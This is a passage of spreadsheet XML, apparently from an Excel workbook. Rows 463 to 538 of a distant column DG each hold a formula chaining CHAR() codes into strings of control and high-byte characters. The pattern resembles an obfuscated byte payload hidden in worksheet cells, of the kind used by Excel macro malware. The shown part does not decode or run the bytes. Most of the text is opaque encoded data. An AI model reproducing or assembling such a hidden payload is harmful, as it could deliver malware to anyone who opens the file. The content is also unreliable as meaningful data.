        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="464" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG464" t="str">
        <f>CHAR(22)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(201)&amp;CHAR(29)&amp;CHAR(51)&amp;CHAR(215)</f>
        <v>_x0016_×Õ†Ë|É_x001D_3×</v>
      </c>
    </row>
    <row r="465" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG465" t="str">
        <f>CHAR(167)&amp;CHAR(134)&amp;CHAR(140)&amp;CHAR(124)&amp;CHAR(246)&amp;CHAR(29)&amp;CHAR(62)&amp;CHAR(215)&amp;CHAR(176)&amp;CHAR(134)</f>
        <v>§†Œ|ö_x001D_&gt;×°†</v>
      </c>
    </row>
    <row r="466" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG466" t="str">
        <f>CHAR(131)&amp;CHAR(124)&amp;CHAR(241)&amp;CHAR(29)&amp;CHAR(52)&amp;CHAR(215)&amp;CHAR(186)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ƒ|ñ_x001D_4×º†Ê|</v>
      </c>
    </row>
    <row r="467" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG467" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(118)&amp;CHAR(215)&amp;CHAR(209)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(203)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_v×Ñ†Ê|Ë_x001D_</v>
      </c>
    </row>
    <row r="468" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG468" t="str">
        <f>CHAR(32)&amp;CHAR(215)&amp;CHAR(180)&amp;CHAR(134)&amp;CHAR(164)&amp;CHAR(124)&amp;CHAR(236)&amp;CHAR(29)&amp;CHAR(62)&amp;CHAR(215)</f>
        <v xml:space="preserve"> ×´†¤|ì_x001D_&gt;×</v>
      </c>
    </row>
    <row r="469" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG469" t="str">
        <f>CHAR(180)&amp;CHAR(134)&amp;CHAR(190)&amp;CHAR(124)&amp;CHAR(246)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(134)</f>
        <v>´†¾|ö_x001D_=×»†</v>
      </c>
    </row>
    <row r="470" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG470" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(45)&amp;CHAR(215)&amp;CHAR(101)&amp;CHAR(130)&amp;CHAR(250)&amp;CHAR(126)</f>
        <v>Ê|Ÿ_x001D_-×e‚ú~</v>
      </c>
    </row>
    <row r="471" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG471" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(134)&amp;CHAR(190)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_S×††¾|í_x001D_</v>
      </c>
    </row>
    <row r="472" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG472" t="str">
        <f>CHAR(59)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(173)&amp;CHAR(124)&amp;CHAR(217)&amp;CHAR(29)&amp;CHAR(59)&amp;CHAR(215)</f>
        <v>;×»†­|Ù_x001D_;×</v>
      </c>
    </row>
    <row r="473" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG473" t="str">
        <f>CHAR(185)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(124)&amp;CHAR(214)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(179)&amp;CHAR(134)</f>
        <v>¹†¯|Ö_x001D_&lt;×³†</v>
      </c>
    </row>
    <row r="474" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG474" t="str">
        <f>CHAR(165)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(94)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)</f>
        <v>¥|Ÿ_x001D_^ÕÕ†Ë|</v>
      </c>
    </row>
    <row r="475" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG475" t="str">
        <f>CHAR(175)&amp;CHAR(29)&amp;CHAR(98)&amp;CHAR(215)&amp;CHAR(226)&amp;CHAR(134)&amp;CHAR(172)&amp;CHAR(124)&amp;CHAR(175)&amp;CHAR(29)</f>
        <v>¯_x001D_b×â†¬|¯_x001D_</v>
      </c>
    </row>
    <row r="476" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG476" t="str">
        <f>CHAR(102)&amp;CHAR(215)&amp;CHAR(183)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(78)&amp;CHAR(215)</f>
        <v>f×·†ú|Ÿ_x001D_N×</v>
      </c>
    </row>
    <row r="477" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG477" t="str">
        <f>CHAR(215)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(220)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(215)&amp;CHAR(184)&amp;CHAR(134)</f>
        <v>×†Ë|Ü_x001D_=×¸†</v>
      </c>
    </row>
    <row r="478" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG478" t="str">
        <f>CHAR(167)&amp;CHAR(124)&amp;CHAR(250)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(161)&amp;CHAR(134)&amp;CHAR(185)&amp;CHAR(124)</f>
        <v>§|ú_x001D_&lt;×¡†¹|</v>
      </c>
    </row>
    <row r="479" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG479" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(238)&amp;CHAR(124)&amp;CHAR(157)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_r×Õ†î|_x001D_</v>
      </c>
    </row>
    <row r="480" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG480" t="str">
        <f>CHAR(83)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(134)&amp;CHAR(165)&amp;CHAR(124)&amp;CHAR(242)&amp;CHAR(29)&amp;CHAR(34)&amp;CHAR(215)</f>
        <v>S×–†¥|ò_x001D_"×</v>
      </c>
    </row>
    <row r="481" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG481" t="str">
        <f>CHAR(180)&amp;CHAR(134)&amp;CHAR(164)&amp;CHAR(124)&amp;CHAR(230)&amp;CHAR(29)&amp;CHAR(28)&amp;CHAR(215)&amp;CHAR(180)&amp;CHAR(134)</f>
        <v>´†¤|æ_x001D__x001C_×´†</v>
      </c>
    </row>
    <row r="482" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG482" t="str">
        <f>CHAR(167)&amp;CHAR(124)&amp;CHAR(250)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(124)</f>
        <v>§|ú_x001D_R×Õ†ê|</v>
      </c>
    </row>
    <row r="483" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG483" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(126)&amp;CHAR(215)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(217)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_~××†Ë|Ù_x001D_</v>
      </c>
    </row>
    <row r="484" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG484" t="str">
        <f>CHAR(59)&amp;CHAR(215)&amp;CHAR(185)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(124)&amp;CHAR(219)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)</f>
        <v>;×¹†¯|Û_x001D_7×</v>
      </c>
    </row>
    <row r="485" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG485" t="str">
        <f>CHAR(166)&amp;CHAR(134)&amp;CHAR(169)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(29)&amp;CHAR(59)&amp;CHAR(215)&amp;CHAR(165)&amp;CHAR(134)</f>
        <v>¦†©|í_x001D_;×¥†</v>
      </c>
    </row>
    <row r="486" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG486" t="str">
        <f>CHAR(190)&amp;CHAR(124)&amp;CHAR(246)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>¾|ö_x001D_=×»†Ê|</v>
      </c>
    </row>
    <row r="487" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG487" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(124)&amp;CHAR(151)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_r×Õ†ú|—_x001D_</v>
      </c>
    </row>
    <row r="488" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG488" t="str">
        <f>CHAR(83)&amp;CHAR(215)&amp;CHAR(147)&amp;CHAR(134)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)</f>
        <v>S×“†£|ó_x001D_7×</v>
      </c>
    </row>
    <row r="489" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG489" t="str">
        <f>CHAR(131)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(29)&amp;CHAR(33)&amp;CHAR(215)&amp;CHAR(188)&amp;CHAR(134)</f>
        <v>ƒ†¯|í_x001D_!×¼†</v>
      </c>
    </row>
    <row r="490" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG490" t="str">
        <f>CHAR(165)&amp;CHAR(124)&amp;CHAR(241)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(124)</f>
        <v>¥|ñ_x001D_R×Õ†ú|</v>
      </c>
    </row>
    <row r="491" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG491" t="str">
        <f>CHAR(177)&amp;CHAR(29)&amp;CHAR(98)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(124)&amp;CHAR(177)&amp;CHAR(29)</f>
        <v>±_x001D_b×û†ú|±_x001D_</v>
      </c>
    </row>
    <row r="492" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG492" t="str">
        <f>CHAR(98)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(158)&amp;CHAR(124)&amp;CHAR(134)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(215)</f>
        <v>b×Õ†ž|†_x001D_S×</v>
      </c>
    </row>
    <row r="493" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG493" t="str">
        <f>CHAR(156)&amp;CHAR(134)&amp;CHAR(164)&amp;CHAR(124)&amp;CHAR(235)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(167)&amp;CHAR(134)</f>
        <v>œ†¤|ë_x001D_7×§†</v>
      </c>
    </row>
    <row r="494" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG494" t="str">
        <f>CHAR(164)&amp;CHAR(124)&amp;CHAR(254)&amp;CHAR(29)&amp;CHAR(62)&amp;CHAR(215)&amp;CHAR(155)&amp;CHAR(134)&amp;CHAR(171)&amp;CHAR(124)</f>
        <v>¤|þ_x001D_&gt;×›†«|</v>
      </c>
    </row>
    <row r="495" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG495" t="str">
        <f>CHAR(242)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(149)&amp;CHAR(124)&amp;CHAR(250)&amp;CHAR(29)</f>
        <v>ò_x001D_7×Õ†•|ú_x001D_</v>
      </c>
    </row>
    <row r="496" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG496" t="str">
        <f>CHAR(42)&amp;CHAR(215)&amp;CHAR(182)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(124)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)</f>
        <v>*×¶†¯|ó_x001D_&lt;×</v>
      </c>
    </row>
    <row r="497" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG497" t="str">
        <f>CHAR(161)&amp;CHAR(134)&amp;CHAR(174)&amp;CHAR(124)&amp;CHAR(240)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(160)&amp;CHAR(134)</f>
        <v>¡†®|ð_x001D_&lt;× †</v>
      </c>
    </row>
    <row r="498" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG498" t="str">
        <f>CHAR(190)&amp;CHAR(124)&amp;CHAR(192)&amp;CHAR(29)&amp;CHAR(19)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(134)&amp;CHAR(136)&amp;CHAR(124)</f>
        <v>¾|À_x001D__x0013_×††ˆ|</v>
      </c>
    </row>
    <row r="499" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG499" t="str">
        <f>CHAR(253)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(131)&amp;CHAR(134)&amp;CHAR(176)&amp;CHAR(124)&amp;CHAR(198)&amp;CHAR(29)</f>
        <v>ý_x001D_&lt;×ƒ†°|Æ_x001D_</v>
      </c>
    </row>
    <row r="500" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG500" t="str">
        <f>CHAR(34)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(122)&amp;CHAR(215)</f>
        <v>"×»†Ê|Ÿ_x001D_z×</v>
      </c>
    </row>
    <row r="501" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG501" t="str">
        <f>CHAR(215)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(211)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(178)&amp;CHAR(134)</f>
        <v>×†Ë|Ó_x001D_7×²†</v>
      </c>
    </row>
    <row r="502" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG502" t="str">
        <f>CHAR(171)&amp;CHAR(124)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(17)&amp;CHAR(215)&amp;CHAR(186)&amp;CHAR(134)&amp;CHAR(186)&amp;CHAR(124)</f>
        <v>«|ó_x001D__x0011_×º†º|</v>
      </c>
    </row>
    <row r="503" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG503" t="str">
        <f>CHAR(230)&amp;CHAR(29)&amp;CHAR(32)&amp;CHAR(215)&amp;CHAR(188)&amp;CHAR(134)&amp;CHAR(173)&amp;CHAR(124)&amp;CHAR(247)&amp;CHAR(29)</f>
        <v>æ_x001D_ ×¼†­|÷_x001D_</v>
      </c>
    </row>
    <row r="504" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG504" t="str">
        <f>CHAR(38)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(126)&amp;CHAR(215)</f>
        <v>&amp;×Õ†ê|Ÿ_x001D_~×</v>
      </c>
    </row>
    <row r="505" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG505" t="str">
        <f>CHAR(215)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(211)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(178)&amp;CHAR(134)</f>
        <v>×†Ë|Ó_x001D_7×²†</v>
      </c>
    </row>
    <row r="506" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG506" t="str">
        <f>CHAR(171)&amp;CHAR(124)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(6)&amp;CHAR(215)&amp;CHAR(167)&amp;CHAR(134)&amp;CHAR(171)&amp;CHAR(124)</f>
        <v>«|ó_x001D__x0006_×§†«|</v>
      </c>
    </row>
    <row r="507" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG507" t="str">
        <f>CHAR(251)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(184)&amp;CHAR(134)&amp;CHAR(171)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(29)</f>
        <v>û_x001D_7×¸†«|í_x001D_</v>
      </c>
    </row>
    <row r="508" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG508" t="str">
        <f>CHAR(57)&amp;CHAR(215)&amp;CHAR(166)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(215)</f>
        <v>9×¦†Ê|Ÿ_x001D_r×</v>
      </c>
    </row>
    <row r="509" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG509" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(174)&amp;CHAR(124)&amp;CHAR(130)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(154)&amp;CHAR(134)</f>
        <v>Õ†®|‚_x001D_S×š†</v>
      </c>
    </row>
    <row r="510" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG510" t="str">
        <f>CHAR(184)&amp;CHAR(124)&amp;CHAR(246)&amp;CHAR(29)&amp;CHAR(53)&amp;CHAR(215)&amp;CHAR(188)&amp;CHAR(134)&amp;CHAR(164)&amp;CHAR(124)</f>
        <v>¸|ö_x001D_5×¼†¤|</v>
      </c>
    </row>
    <row r="511" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG511" t="str">
        <f>CHAR(254)&amp;CHAR(29)&amp;CHAR(62)&amp;CHAR(215)&amp;CHAR(147)&amp;CHAR(134)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(243)&amp;CHAR(29)</f>
        <v>þ_x001D_&gt;×“†£|ó_x001D_</v>
      </c>
    </row>
    <row r="512" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG512" t="str">
        <f>CHAR(55)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(171)&amp;CHAR(124)&amp;CHAR(242)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(215)</f>
        <v>7×»†«|ò_x001D_7×</v>
      </c>
    </row>
    <row r="513" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG513" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(149)&amp;CHAR(124)&amp;CHAR(250)&amp;CHAR(29)&amp;CHAR(42)&amp;CHAR(215)&amp;CHAR(182)&amp;CHAR(134)</f>
        <v>Õ†•|ú_x001D_*×¶†</v>
      </c>
    </row>
    <row r="514" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG514" t="str">
        <f>CHAR(175)&amp;CHAR(124)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(161)&amp;CHAR(134)&amp;CHAR(174)&amp;CHAR(124)</f>
        <v>¯|ó_x001D_&lt;×¡†®|</v>
      </c>
    </row>
    <row r="515" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG515" t="str">
        <f>CHAR(240)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(160)&amp;CHAR(134)&amp;CHAR(190)&amp;CHAR(124)&amp;CHAR(192)&amp;CHAR(29)</f>
        <v>ð_x001D_&lt;× †¾|À_x001D_</v>
      </c>
    </row>
    <row r="516" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG516" t="str">
        <f>CHAR(19)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(134)&amp;CHAR(136)&amp;CHAR(124)&amp;CHAR(253)&amp;CHAR(29)&amp;CHAR(60)&amp;CHAR(215)</f>
        <v>_x0013_×††ˆ|ý_x001D_&lt;×</v>
      </c>
    </row>
    <row r="517" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG517" t="str">
        <f>CHAR(131)&amp;CHAR(134)&amp;CHAR(176)&amp;CHAR(124)&amp;CHAR(198)&amp;CHAR(29)&amp;CHAR(34)&amp;CHAR(215)&amp;CHAR(187)&amp;CHAR(134)</f>
        <v>ƒ†°|Æ_x001D_"×»†</v>
      </c>
    </row>
    <row r="518" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG518" t="str">
        <f>CHAR(228)&amp;CHAR(124)&amp;CHAR(250)&amp;CHAR(29)&amp;CHAR(42)&amp;CHAR(215)&amp;CHAR(176)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>ä|ú_x001D_*×°†Ê|</v>
      </c>
    </row>
    <row r="519" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG519" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(118)&amp;CHAR(215)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(207)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_v××†Ë|Ï_x001D_</v>
      </c>
    </row>
    <row r="520" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG520" t="str">
        <f>CHAR(32)&amp;CHAR(215)&amp;CHAR(186)&amp;CHAR(134)&amp;CHAR(174)&amp;CHAR(124)&amp;CHAR(234)&amp;CHAR(29)&amp;CHAR(49)&amp;CHAR(215)</f>
        <v xml:space="preserve"> ×º†®|ê_x001D_1×</v>
      </c>
    </row>
    <row r="521" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG521" t="str">
        <f>CHAR(161)&amp;CHAR(134)&amp;CHAR(132)&amp;CHAR(124)&amp;CHAR(254)&amp;CHAR(29)&amp;CHAR(63)&amp;CHAR(215)&amp;CHAR(176)&amp;CHAR(134)</f>
        <v>¡†„|þ_x001D_?×°†</v>
      </c>
    </row>
    <row r="522" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG522" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(226)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_r×Õ†â|</v>
      </c>
    </row>
    <row r="523" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG523" t="str">
        <f>CHAR(157)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(133)&amp;CHAR(134)&amp;CHAR(184)&amp;CHAR(124)&amp;CHAR(240)&amp;CHAR(29)</f>
        <v>_x001D_S×…†¸|ð_x001D_</v>
      </c>
    </row>
    <row r="524" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG524" t="str">
        <f>CHAR(54)&amp;CHAR(215)&amp;CHAR(160)&amp;CHAR(134)&amp;CHAR(169)&amp;CHAR(124)&amp;CHAR(235)&amp;CHAR(29)&amp;CHAR(4)&amp;CHAR(215)</f>
        <v>6× †©|ë_x001D__x0004_×</v>
      </c>
    </row>
    <row r="525" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG525" t="str">
        <f>CHAR(176)&amp;CHAR(134)&amp;CHAR(184)&amp;CHAR(124)&amp;CHAR(236)&amp;CHAR(29)&amp;CHAR(59)&amp;CHAR(215)&amp;CHAR(186)&amp;CHAR(134)</f>
        <v>°†¸|ì_x001D_;×º†</v>
      </c>
    </row>
    <row r="526" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG526" t="str">
        <f>CHAR(164)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>¤|Ÿ_x001D_r×Õ†Ê|</v>
      </c>
    </row>
    <row r="527" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG527" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="528" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG528" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="529" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG529" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="530" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG530" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="531" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG531" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="532" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG532" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="533" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG533" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="534" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG534" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="535" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG535" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="536" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG536" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="537" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG537" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="538" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG538" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="539" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG539" t="str">
